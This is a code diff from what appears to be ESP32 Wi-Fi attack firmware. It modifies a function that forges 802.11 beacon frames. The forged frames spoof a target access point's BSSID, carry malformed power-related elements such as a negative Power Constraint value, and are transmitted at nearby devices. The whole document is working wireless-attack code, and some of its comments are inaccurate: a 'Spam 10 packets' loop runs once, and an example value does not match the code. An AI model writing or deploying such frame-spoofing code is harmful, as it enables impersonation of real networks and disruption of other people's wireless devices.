@@ -362,35 +362,70 @@ void wifi_attack_deauth_client_negative_tx_power(void)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
         0x00, 0x00, // Sequence Control
-        0x64, 0x00, // Beacon Interval
-        0x31, 0x04, // Capability Information
+        0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
+        0x64, 0x00, // Beacon Interval (102.4ms)
+        0x31, 0x04  // Capability Information
     };
     memcpy(&beacon_frame_negative_tx[10], target.bssid, 6);    // Source Address
     memcpy(&beacon_frame_negative_tx[16], target.bssid, 6);    // BSSID 
-    /* Add SSID */
     int offset = 36;
-    beacon_frame_negative_tx[offset++] = 0x00;      // SSID Element ID
-    beacon_frame_negative_tx[offset++] = strlen((char *)&target.ssid); // SSID Length
-    memcpy(&beacon_frame_negative_tx[offset], target.ssid, strlen((char *)&target.ssid));
+    // 2. Tagged Parameters
+    // SSID Parameter
+    beacon_frame_negative_tx[offset++] = 0x00;          // SSID Tag Number
+    beacon_frame_negative_tx[offset++] = strlen((char *)&target.ssid); // SSID Tag Length
+    memcpy(beacon_frame_negative_tx + offset, (char *)&target.ssid, strlen((char *)&target.ssid));
     offset += strlen((char *)&target.ssid);
-    /* Add negative TX power */
-    beacon_frame_negative_tx[offset++] = 0x32;      // TX Power Element ID
-    beacon_frame_negative_tx[offset++] = 1;         // Length of TX Power Field
-    beacon_frame_negative_tx[offset++] = -20;       // Valore TX Power (negativo o fuori standard)
-    /* Add other Information Elements */
-    beacon_frame_negative_tx[offset++] = 0x01;      // Supported Rates Element ID
-    beacon_frame_negative_tx[offset++] = 8;         // Length
-    memcpy(&beacon_frame_negative_tx[offset], "\x02\x04\x0B\x16\x0C\x12\x18\x24", 8);
-    offset += 8;
-    /* Channel */
-    beacon_frame_negative_tx[offset++] = 0x03;        // DS Parameter Set (Channel)
-    beacon_frame_negative_tx[offset++] = 1;           // Length
-    beacon_frame_negative_tx[offset++] = target.channel;
+
+    /* Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps) */
+    beacon_frame_negative_tx[offset++] = 0x01;          // Supported Rates Tag Number
+    beacon_frame_negative_tx[offset++] = 3;             // Length
+    beacon_frame_negative_tx[offset++] = 0x02;          // 1 Mbps
+    beacon_frame_negative_tx[offset++] = 0x04;          // 2 Mbps
+    beacon_frame_negative_tx[offset++] = 0x0B;          // 5.5 Mbps
+    //beacon_frame_negative_tx[offset++] = 0x16;          // 11 Mbps
+
+    // DS Parameter Set (Channel)
+    beacon_frame_negative_tx[offset++] = 0x03;          // DS Parameter Set Tag Number
+    beacon_frame_negative_tx[offset++] = 1;             // Length
+    beacon_frame_negative_tx[offset++] = target.channel;       // Channel Number
+
+    // Traffic Indication Map (TIM)
+    beacon_frame_negative_tx[offset++] = 0x05;          // TIM Tag Number
+    beacon_frame_negative_tx[offset++] = 4;             // Length
+    beacon_frame_negative_tx[offset++] = 0x00;          // DTIM Count
+    beacon_frame_negative_tx[offset++] = 0x01;          // DTIM Period
+    beacon_frame_negative_tx[offset++] = 0x00;          // Bitmap Control
+    beacon_frame_negative_tx[offset++] = 0x00;          // Partial Virtual Bitmap
+
+    // // RSN Information (WPA2)
+    // uint8_t rsn_info[] = {
+    //     0x30,                         // RSN Information Tag Number
+    //     0x18,                         // Length
+    //     0x01, 0x00,                   // Version
+    //     0x00, 0x0F, 0xAC, 0x04,       // Group Cipher Suite (CCMP)
+    //     0x01, 0x00,                   // Pairwise Cipher Suite Count
+    //     0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher Suite (CCMP)
+    //     0x01, 0x00,                   // Authentication Suite Count
+    //     0x00, 0x0F, 0xAC, 0x02,       // Authentication Suite (PSK)
+    //     0x00, 0x00                    // RSN Capabilities
+    // };
+    // memcpy(beacon_frame_negative_tx + offset, rsn_info, sizeof(rsn_info));
+    // offset += sizeof(rsn_info);
+
+    // TCP Report Transmission Power (TX Power Level)
+    beacon_frame_negative_tx[offset++] = 0x33;          // TCP Report TX Power Tag Number
+    beacon_frame_negative_tx[offset++] = 1;             // Length
+    beacon_frame_negative_tx[offset++] = 15;      // TX Power Level
+
+    // Power Constraint
+    beacon_frame_negative_tx[offset++] = 0x20;          // Power Constraint Tag Number
+    beacon_frame_negative_tx[offset++] = 1;             // Length
+    beacon_frame_negative_tx[offset++] = -1;             // Power Constraint (Example: 3 dBm)
 
     /* Spam 10 packets */
     for (int i = 10; i <= 10; i++) 
     {
-        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, sizeof(beacon_frame_negative_tx), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, offset, false);
         vTaskDelay(pdMS_TO_TICKS(2));
     }
 }
